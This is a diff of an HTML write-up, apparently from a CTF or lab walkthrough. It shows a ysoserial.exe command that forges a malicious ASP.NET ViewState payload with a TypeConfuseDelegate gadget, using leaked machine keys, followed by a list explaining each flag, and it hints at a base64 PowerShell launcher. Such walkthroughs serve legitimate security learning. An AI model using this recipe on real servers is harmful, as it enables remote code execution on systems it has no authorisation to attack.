@@ -147,13 +147,14 @@ cmdline = “powershell -e “ + base64.b64encode(payload.encode(‘utf16’)[2:
 ```bash
 ./ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "yourpaload" --path="/portfolio/default.aspx" --appath="/" --decryptionalg="AES" --decryptionkey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" --validationalg="SHA1" --validationkey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468"
 </code></pre></div></div>
+
 <p><br /><br /></p>
 <ul>
-  <li><strong><code class="language-plaintext highlighter-rouge">./ysoserial.exe</code></strong>: :  Tool used to deserialization attacks<br /><br /></li>
-  <li><strong><code class="language-plaintext highlighter-rouge">-p ViewState</code></strong>: Specifies the payload type<br /><br /></li>
-  <li><strong><code class="language-plaintext highlighter-rouge">-g TypeConfuseDelegate</code></strong>: Specifies the gadget type. Gadget chains are sequences of classes and methods that when serialized and deserialized, lead to arbitrary code execution.This gadget type targets a broader range of scenarios where deserialization of objects with delegate properties is performed.<br /><br /></li>
-  <li><strong><code class="language-plaintext highlighter-rouge">--path="/portfolio/default.aspx"</code></strong>: Specifies the path to the ASPX file where the ViewState will be injected.<br /><br /></li>
-  <li><strong><code class="language-plaintext highlighter-rouge">--appath="/"</code></strong>: Specifies the application path. In this case, it’s set to the root path (“/”) of the web application.Ty<br /><br /></li>
+  <li><strong>./ysoserial.exe</strong>: :  Tool used to deserialization attacks<br /><br /></li>
+  <li><strong>-p ViewState</strong>: Specifies the payload type<br /><br /></li>
+  <li><strong>-g TypeConfuseDelegate</strong>: Specifies the gadget type. Gadget chains are sequences of classes and methods that when serialized and deserialized, lead to arbitrary code execution.This gadget type targets a broader range of scenarios where deserialization of objects with delegate properties is performed.<br /><br /></li>
+  <li><strong>–path=”/portfolio/default.aspx”</strong>: Specifies the path to the ASPX file where the ViewState will be injected.<br /><br /></li>
+  <li><strong>–appath=”/”</strong>: Specifies the application path. In this case, it’s set to the root path (“/”) of the web application.Ty<br /><br /></li>
 </ul>
 
 <p><img src="/assets/images/cec5d0f0-764b-4005-9f93-0106f9cc1339-export-4ac175f3-58e3-48bd-ba40-ea331e233254/cec5d0f0-764b-4005-9f93-0106f9cc1339-export-4ac175f3-58e3-48bd-ba40-ea331e233254_Untitled_7.png" alt="Untitled" />
